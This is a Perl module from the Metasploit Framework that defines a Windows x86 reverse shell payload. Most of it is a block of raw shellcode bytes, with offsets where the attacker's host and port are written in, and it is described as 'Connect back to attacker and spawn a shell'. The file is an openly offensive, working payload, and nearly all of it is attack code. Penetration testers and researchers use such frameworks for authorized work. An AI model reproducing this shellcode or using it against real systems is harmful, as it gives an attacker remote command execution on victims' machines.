
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::902_reverse;
use strict;
use base 'Msf::PayloadComponent::Win32Payload';
sub load {
  Msf::PayloadComponent::Win32Payload->import('Msf::PayloadComponent::ReverseConnection');
}

my $info =
{
  'Name'         => 'Windows Reverse Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'win32' ],
  'Size'         => '',

  # win32 specific code
  'Win32Payload' =>
    {
      Offsets => { 'LPORT' => [180, 'n'], 'LHOST' => [174, 'ADDR'], 'EXITFUNC' => [293, 'V'] },
      Payload =>
        "\x6a\xeb\x52\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45\x3c".
        "\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x33".
        "\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1".
        "\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe2\x8b\x5f\x24\x01".
        "\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89".
        "\x44\x24\x1c\x61\xc3\x31\xf6\x64\x8b\x76\x18\xad\xad\x8b\x40\xe4".
        "\x48\x66\x31\xc0\x66\x81\x38\x4d\x5a\x75\xf5\x5e\x68\x8e\x4e\x0e".
        "\xec\x50\xff\xd6\x31\xdb\x66\x53\x66\x68\x33\x32\x68\x77\x73\x32".
        "\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6\x5f\x6a\x02\x59".
        "\x89\xe5\x66\x81\xed\x08\x02\x55\x51\xff\xd0\x68\xd9\x09\xf5\xad".
        "\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68\x7f\x00".
        "\x00\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60".
        "\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d".
        "\x6a\x54\x59\x29\xcc\x89\xe7\x89\xe2\x31\xc0\xf3\xaa\x95\x89\xfd".
        "\x59\x6a\x44\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab\x68".
        "\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51\x6a".
        "\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6\x6a".
        "\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6\xff".
        "\x77\xfc\xff\xd0\x68\x7e\xd8\xe2\x73\x53\xff\xd6\xff\xd0",
    },
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
